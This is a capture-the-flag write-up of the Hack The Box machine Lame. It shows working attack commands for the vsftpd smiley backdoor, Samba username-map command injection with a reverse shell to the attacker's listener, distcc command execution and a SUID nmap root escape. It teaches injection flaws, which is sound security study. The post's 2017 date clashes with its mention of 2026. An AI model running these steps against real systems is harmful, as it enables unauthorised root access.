---
layout: post
title: "The Username Was the Weapon"
subtitle: "HTB Lame, the platform's first box, where a backslash in a login field hands you root and the real lesson hides in the doors that stay shut"
date: 2017-06-02 12:00:00 +0000
description: "Lame is box number one, and it teaches the oldest lesson there is: a login field that runs your shell."
image: /assets/og/the-username-was-the-weapon.png
tags: [hackthebox, writeup]
---

Lame is box number one. The first machine Hack The Box ever published, the front door to a whole community, and it is named for exactly how it plays. There is no clever chain here, no twelve-hour climb, no leak that hands you blueprints. There is an old Samba server that, when you type a username with a backslash and a backtick in it, runs whatever you put after the backtick. As root. You do not break in so much as walk up to the login window and hand it a sentence that happens to also be a command. The server reads the command. That is the entire box, and that is also the whole reason it still matters: it is the cleanest possible demonstration of the oldest bug in the book, the one where data and instructions get mixed up at the door.

```
        L A M E
        =======
        login:  /=`your command here`
                     |
                     v
        samba reads the name, sees a backtick,
        and helpfully runs the part in the quotes
                     |
                     v
        no password. no second step.
        the prompt that comes back is already root.
                                            門
```

## 0x01 · the doormat

Five ports answer, and every one of them is a fossil. A quick `nmap -sC -sV` against the box paints a picture of a machine that time forgot.

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1
```

Read that like a tell. `vsftpd 2.3.4`, the version with the famous smiley-face backdoor. `Samba 3.0.20`, old enough to vote. `distccd`, a service almost nobody runs on purpose anymore. This is not a hardened target wearing a clever disguise. This is Ubuntu 8.04 left running in a closet, and the box is daring you to pick which decade-old hole to climb through. Three of them are real. One of them is a trap, and the trap teaches as much as the holes do.

## 0x02 · the smiley that goes nowhere

Start with the obvious bait. `vsftpd 2.3.4` shipped, for a window in 2011, with a backdoor sewn into its own source code (CVE-2011-2523). The trigger is almost a joke. You log in with any username that ends in `:)`, a literal smiley face, and the server opens a root command shell on port 6200.

```
# nc 10.10.10.3 21
USER iceberg:)
PASS anything
# then connect to 6200 and you should land a root shell...
```

Except on Lame you connect to 6200 and nothing answers. The backdoor fires, the shell tries to open, and a firewall rule sitting between you and that high port drops the connection on the floor. Picture a vending machine that takes your coin, drops the candy bar behind a sheet of glued-shut glass, and shrugs. The mechanism works perfectly. The payout is walled off. This is the box's first real lesson, and it costs you twenty minutes to learn it: a vulnerable version number is a rumor, not a guarantee. The thing has to actually be reachable to be a way in.

## 0x03 · the backslash that became a shell

Now the real door. Samba 3.0.20 carries CVE-2007-2447, known forever as the username map script bug, and it is the kind of flaw that should be framed and hung in a museum because it is so pure.

Here is what went wrong, in plain terms. Samba had a feature where an admin could map incoming usernames through a helper script, basically a little rule that says "when someone logs in as X, treat them as Y." To run that script, Samba took the username you typed and pasted it straight into a shell command. And it did this *before* checking your password. Think of it like a bouncer who, before even looking at your ID, reads your name out loud to the kitchen over the intercom. If your name is "Bob," fine. If your name is "Bob; burn down the building," the kitchen hears a perfectly good instruction and gets to work. The bouncer never even checked whether you were on the list.

So the attack is just a username built like a command. You feed Samba a name shaped like ``/=`...` ``, and everything inside the backticks runs on the server as whatever account smbd uses, which on this box is root. No exploit binary, no memory corruption, no shellcode. The payload is the login field.

You can do it by hand with `smbclient`, using its `logon` command to control the username sent on the wire.

```
# smbclient //10.10.10.3/tmp -U "/=`nohup [reverse shell: nc back to 10.10.14.4 on 443]`"
```

Spell out the reverse shell however your listener likes; the bracketed placeholder above is just "call my netcat catcher back." The point is the wrapper. That ``/=`...` `` is the whole exploit, and the part inside the backticks is the only part that varies. Start a listener, fire the connection, and a prompt drops into your lap.

```
# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3]
id
uid=0(root) gid=0(root)
```

Read that `id` twice. Not a user. Not a service account you have to escalate from. Root, on the first move, because the username was the weapon.

```
# cat /root/root.txt
████████████████████████████████
# cat /home/makis/user.txt
████████████████████████████████
```

## 0x04 · the long way, for the muscle memory

Lame hands you root in one breath, which makes it a poor place to *practice*, so it is worth walking the scenic route the box also leaves open. Port 3632 runs `distccd`, a daemon that farms out compiler jobs across machines, and the 2004-era version here (CVE-2004-2687) does not bother to check whether you are allowed to submit work. A compile job is just a command, and the server runs it. Same disease as the Samba bug in a different organ: a service treating attacker input as instructions.

The tidy way to trigger it is the nmap script that ships for exactly this.

```
# nmap -p 3632 10.10.10.3 --script distcc-exec \
    --script-args="distcc-exec.cmd='id'"
| distcc-exec:
|   uid=1(daemon) gid=1(daemon)
```

This time the shell comes back as `daemon`, a nobody account, which is the *point* of taking this path. Now you have somewhere to climb from, and Lame leaves the ladder out. Run a quick `find / -perm -4000 2>/dev/null` and you discover `nmap` itself is SUID root. Old nmap had an interactive mode with a shell escape, and SUID means that escape inherits root.

```
daemon@lame:/$ nmap --interactive
nmap> !sh
# id
uid=0(root) ...
```

A program that runs as root and lets you spawn a shell from inside it is a program that hands out its own crown. Think of it like a security guard's master key left in a photocopier that anyone can operate. The copier was supposed to copy paper. It will just as happily copy the key. There is a second route too, the root account's `authorized_keys` containing one of the Debian weak SSH keys (CVE-2008-0166), where a broken random number generator in 2008 meant the entire universe of "secret" keys fit in a list you can download. Either way you arrive at the same uid=0, having actually had to think for a minute, which is the version of Lame worth doing.

## 0x05 · the honest caveat

It is tempting to file Lame under "ancient, irrelevant, fixed years ago," and the specific CVEs absolutely are fixed. Nobody is shipping Samba 3.0.20 in 2026. But the bug class on display is not a fossil at all. CVE-2007-2447 is an injection bug, the same family that powers SQL injection, command injection, and the log-parsing disaster the whole industry lost a December to. Every one of them is the identical confession: somewhere, a program took something a stranger typed and treated part of it as an instruction instead of as inert data. The username was supposed to be a label. It became a command because nobody drew a hard line between the two.

That line is the entire job. A login field, a search box, a filename, a URL parameter, a log message, these are all just envelopes that are supposed to hold text and nothing more. The moment your code lets the contents of the envelope reach into the machinery and pull a lever, you have rebuilt CVE-2007-2447 in a new costume. Lame is easy not because the lesson is small but because the lesson is so old and so total that the box does not need to dress it up. It just opens the login window and shows you the oldest mistake there is, still working.

And keep the smiley in mind too. The vsftpd backdoor was *present* and still got you nowhere, because a firewall stood between the trigger and the prize. Vulnerable is not the same as exploitable. Reachability is half the battle, and it cuts both ways: it saves the careless defender sometimes, and it humbles the attacker who trusts a version number over a connection test.

## 0x06 · outro

```
the server asked for a name.
you handed it a command, and it could not tell the difference.
no password. no exploit. just a label that pulled a lever.

box number one, and it already knew the only secret that matters:
data that gets to give orders is not data anymore.

draw the line. test the door. wear black.

                                                            EOF
```

---

*HTB: Lame, retired 26 May 2017. The first box the platform ever shipped, and a one-move root that is really a lecture on injection wearing a decade-old Samba costume. The smiley still smiles in a lab and nowhere you don't own.*